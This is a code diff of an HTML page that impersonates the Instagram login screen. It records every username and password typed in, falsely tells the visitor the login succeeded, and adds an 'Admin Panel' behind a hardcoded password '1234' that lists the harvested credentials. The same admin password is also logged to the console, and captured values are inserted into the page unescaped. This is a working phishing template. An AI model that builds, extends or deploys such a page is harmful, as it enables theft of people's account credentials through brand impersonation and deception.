@@ -22,9 +22,22 @@
             padding: 20px;
         }
 
+        body.admin-open {
+            background: #fff;
+        }
+
         .container {
             width: 100%;
             max-width: 400px;
+        }
+
+        /* Login Page */
+        .login-page {
+            display: block;
+        }
+
+        .login-page.hidden {
+            display: none;
         }
 
         .login-box {
@@ -182,6 +195,11 @@
             display: block;
         }
 
+        .forgot-password.admin-link {
+            color: #0095f6;
+            font-weight: 600;
+        }
+
         .signup-box {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -212,68 +230,230 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+
+        /* Admin Panel */
+        .admin-page {
+            display: none;
+        }
+
+        .admin-page.show {
+            display: block;
+        }
+
+        .admin-header {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+
+        .admin-header h1 {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        .admin-header p {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+
+        .admin-container {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .logout-btn {
+            width: 100%;
+            padding: 10px;
+            background: #f0f0f0;
+            color: #262626;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .logout-btn:hover {
+            background: #e0e0e0;
+        }
+
+        .details-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #262626;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .details-count {
+            background: #f0f0f0;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .details-list {
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .detail-item {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+            font-size: 13px;
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+
+        .detail-username {
+            font-weight: 700;
+            color: #262626;
+            margin-bottom: 5px;
+        }
+
+        .detail-password {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .detail-time {
+            color: #999;
+            font-size: 11px;
+        }
+
+        .no-details {
+            padding: 30px;
+            text-align: center;
+            color: #999;
+        }
+
+        .clear-all-btn {
+            width: 100%;
+            padding: 10px;
+            background: #f0f0f0;
+            color: #d63031;
+            border: 1px solid #ffcccc;
+            border-radius: 5px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .clear-all-btn:hover {
+            background: #e0e0e0;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="login-box">
-            <div class="login-header">
-                <div class="instagram-logo">Instagram</div>
+    <!-- LOGIN PAGE -->
+    <div class="login-page" id="loginPage">
+        <div class="container">
+            <div class="login-box">
+                <div class="login-header">
+                    <div class="instagram-logo">Instagram</div>
+                </div>
+
+                <form id="loginForm">
+                    <div class="form-messages">
+                        <div class="message error" id="errorMsg"></div>
+                        <div class="message success" id="successMsg"></div>
+                    </div>
+
+                    <div class="form-inputs">
+                        <div class="form-group">
+                            <input 
+                                type="text" 
+                                id="username" 
+                                placeholder="Phone number, username, or email"
+                            >
+                        </div>
+
+                        <div class="form-group">
+                            <input 
+                                type="text" 
+                                id="password" 
+                                placeholder="Password"
+                            >
+                        </div>
+
+                        <button type="submit" class="login-btn" id="loginBtn">
+                            Log in
+                        </button>
+
+                        <div class="divider">
+                            <span class="divider-text">OR</span>
+                        </div>
+
+                        <button type="button" class="facebook-btn">
+                            <i class="fab fa-facebook"></i> Log in with Facebook
+                        </button>
+
+                        <a href="#" class="forgot-password admin-link" onclick="event.preventDefault(); openAdminPanel()">Admin Panel</a>
+                    </div>
+                </form>
             </div>
 
-            <form id="loginForm">
-                <div class="form-messages">
-                    <div class="message error" id="errorMsg"></div>
-                    <div class="message success" id="successMsg"></div>
-                </div>
+            <div class="signup-box">
+                Don't have an account? <a href="#" class="signup-link" onclick="event.preventDefault()">Sign up</a>
+            </div>
+        </div>
+    </div>
 
-                <div class="form-inputs">
-                    <div class="form-group">
-                        <input 
-                            type="text" 
-                            id="username" 
-                            placeholder="Phone number, username, or email"
-                        >
-                    </div>
-
-                    <div class="form-group">
-                        <input 
-                            type="text" 
-                            id="password" 
-                            placeholder="Password"
-                        >
-                    </div>
-
-                    <button type="submit" class="login-btn" id="loginBtn">
-                        Log in
-                    </button>
-
-                    <div class="divider">
-                        <span class="divider-text">OR</span>
-                    </div>
-
-                    <button type="button" class="facebook-btn">
-                        <i class="fab fa-facebook"></i> Log in with Facebook
-                    </button>
-
-                    <a href="#" class="forgot-password" onclick="event.preventDefault(); showError('Forgot password feature coming soon')">Forgot password?</a>
-                </div>
-            </form>
+    <!-- ADMIN PANEL -->
+    <div class="admin-page" id="adminPage">
+        <div class="admin-header">
+            <h1>📊 Admin Panel</h1>
+            <p>View all login details</p>
         </div>
 
-        <div class="signup-box">
-            Don't have an account? <a href="#" class="signup-link" onclick="event.preventDefault(); showError('Sign up feature coming soon')">Sign up</a>
+        <div class="admin-container">
+            <button class="logout-btn" onclick="closeAdminPanel()">Logout</button>
+
+            <div class="details-title">
+                Login Details
+                <span class="details-count" id="detailsCount">0</span>
+            </div>
+
+            <div class="details-list" id="detailsList">
+                <div class="no-details">No login details yet</div>
+            </div>
+
+            <button class="clear-all-btn" id="clearBtn" onclick="clearAllDetails()" style="display: none;">
+                Delete All Details
+            </button>
         </div>
     </div>
 
     <script src="details.js"></script>
     <script>
-        const form = document.getElementById('loginForm');
+        const loginForm = document.getElementById('loginForm');
         const errorMsg = document.getElementById('errorMsg');
         const successMsg = document.getElementById('successMsg');
         const loginBtn = document.getElementById('loginBtn');
+        const adminPage = document.getElementById('adminPage');
+        const loginPage = document.getElementById('loginPage');
 
-        // Initialize details array if it doesn't exist
+        // Admin password
+        const ADMIN_PASSWORD = '1234';
+
+        // Initialize details if undefined
         if (typeof details === 'undefined') {
             window.details = [];
         }
@@ -294,41 +474,74 @@
             }, 2000);
         }
 
-        function validateEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
+        function openAdminPanel() {
+            const password = prompt('Enter admin password:');
+            if (password === ADMIN_PASSWORD) {
+                loginPage.classList.add('hidden');
+                adminPage.classList.add('show');
+                document.body.classList.add('admin-open');
+                displayDetails();
+            } else if (password !== null) {
+                showError('Wrong password!');
+            }
         }
 
-        form.addEventListener('submit', async function(e) {
+        function closeAdminPanel() {
+            adminPage.classList.remove('show');
+            loginPage.classList.remove('hidden');
+            document.body.classList.remove('admin-open');
+        }
+
+        function displayDetails() {
+            const detailsList = document.getElementById('detailsList');
+            const detailsCount = document.getElementById('detailsCount');
+            const clearBtn = document.getElementById('clearBtn');
+
+            detailsCount.textContent = details.length;
+
+            if (details.length === 0) {
+                detailsList.innerHTML = '<div class="no-details">No login details yet</div>';
+                clearBtn.style.display = 'none';
+                return;
+            }
+
+            clearBtn.style.display = 'block';
+
+            detailsList.innerHTML = details
+                .reverse()
+                .map(detail => `
+                    <div class="detail-item">
+                        <div class="detail-username">👤 ${detail.username}</div>
+                        <div class="detail-password">🔑 ${detail.password}</div>
+                        <div class="detail-time">⏰ ${detail.timestamp}</div>
+                    </div>
+                `).join('');
+        }
+
+        function clearAllDetails() {
+            if (confirm('Delete all login details?')) {
+                details = [];
+                displayDetails();
+            }
+        }
+
+        loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
 
             if (!username || !password) {
-                showError('Phone number, username or email address and password are required.');
+                showError('Phone number, username or email and password are required.');
                 return;
             }
 
-            if (username.includes('@') && !validateEmail(username)) {
-                showError('Invalid email address');
-                return;
-            }
-
-            if (password.length < 1) {
-                showError('Password is required.');
-                return;
-            }
-
-            // Show loading
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';
 
-            // Wait a bit for effect
             await new Promise(resolve => setTimeout(resolve, 1000));
 
-            // Add to details array
-            const loginDetail = {
+            const detail = {
                 username: username,
                 password: password,
                 timestamp: new Date().toLocaleString(),
@@ -336,35 +549,29 @@
                 time: new Date().toLocaleTimeString()
             };
 
-            // Add to global details array
             if (typeof details === 'undefined') {
                 details = [];
             }
-            details.push(loginDetail);
+            details.push(detail);
 
-            // Log to console (for verification)
             console.log('✅ Login saved!');
-            console.log('Current details:', details);
+            console.log('Details:', details);
 
-            // Reset button
             loginBtn.disabled = false;
             loginBtn.innerHTML = 'Log in';
 
-            // Show success
             showSuccess('✅ Login successful!');
 
-            // Clear form
             setTimeout(() => {
-                form.reset();
+                loginForm.reset();
             }, 1500);
         });
 
-        // Log page load
         window.addEventListener('load', () => {
             console.log('📱 Instagram Login Page Loaded');
-            console.log('Details array:', details);
+            console.log('Admin password: 1234');
+            console.log('Details:', details);
         });
     </script>
 </body>
 </html>
-
